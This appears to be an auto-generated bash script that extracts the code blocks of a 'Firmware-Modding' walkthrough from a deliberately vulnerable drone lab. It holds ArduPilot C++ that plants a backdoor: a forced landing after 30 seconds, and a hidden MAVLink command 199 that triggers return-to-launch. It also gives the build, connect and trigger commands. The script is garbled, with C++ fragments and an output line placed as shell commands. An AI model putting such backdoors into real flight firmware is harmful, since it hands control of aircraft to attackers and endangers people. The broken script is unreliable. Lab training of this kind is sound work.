#!/usr/bin/env bash
# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Firmware-Modding.md
# Created: 2025-11-23 15:43:26
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.
set -euo pipefail

# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
fi

log "[ATTACK] id=firmware-modding src=Firmware-Modding.md"
log "[BLOCK 1] type=shell"
if (millis() > 30000) {
    gcs().send_text(MAV_SEVERITY_CRITICAL, "Malicious Landing Triggered.");
    set_mode(LAND, MODE_REASON_GCS_COMMAND);
}

log "[BLOCK 2] type=shell"
case 199:  // Arbitrary unassigned command
    gcs().send_text(MAV_SEVERITY_NOTICE, "Backdoor command received");
    set_mode(RTL, MODE_REASON_GCS_COMMAND);
    break;

log "[BLOCK 3] type=shell"
cd /opt/ardupilot
./waf distclean
./waf configure --board sitl
./waf copter

log "[BLOCK 4] type=shell"
build/sitl/bin/arducopter

log "[BLOCK 5] type=shell"
mavproxy.py --master=tcp:127.0.0.1:5760

log "[BLOCK 6] type=shell"
command long 1 1 199 0 0 0 0 0 0 0

log "[BLOCK 7] type=shell"
Backdoor command received

